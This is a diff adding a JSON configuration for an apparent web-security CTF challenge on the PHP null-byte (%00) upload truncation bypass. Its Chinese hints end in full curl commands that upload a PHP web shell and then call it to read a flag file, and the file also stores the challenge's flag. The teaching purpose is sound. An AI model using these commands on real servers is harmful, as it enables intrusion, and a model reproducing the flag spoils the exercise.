@@ -1,0 +1,24 @@
+{
+  "id": "upload5",
+  "category": "upload",
+  "title": "%00 截断",
+  "difficulty": "medium",
+  "url_path": "/upload5",
+  "runtime": "php",
+  "entry": "index.php",
+  "flag": "flag{upload5_79e3cdba}",
+  "knowledge": [
+    "%00 截断",
+    "C 字符串与 \\0",
+    "PHP 5.3.4 修复史",
+    "GET 参数拼接保存路径"
+  ],
+  "hints": [
+    "保存名来自 GET 参数 ?save=xxx，服务端会拼成 uploads/xxx.jpg。想让 .jpg 消失，需要一个能让 PHP 字符串“提前结束”的东西。",
+    "URL 里传 %00，PHP 解码后得到 \\0 字节。本环境复刻了 PHP<5.3.4 的行为：路径里的 \\0 之后的字符（包括强拼的 .jpg）都会被截断。",
+    "完整命令：\ncurl -F \"avatar=@shell.php\" \"http://TARGET/upload5/?save=shell.php%00\"\ncurl \"http://TARGET/upload5/uploads/shell.php?f=../flag.php\"（或 system 版 ?c=cat%20../flag.php）"
+  ],
+  "writeup": "writeup.md",
+  "prev": "upload4",
+  "next": "upload6"
+}
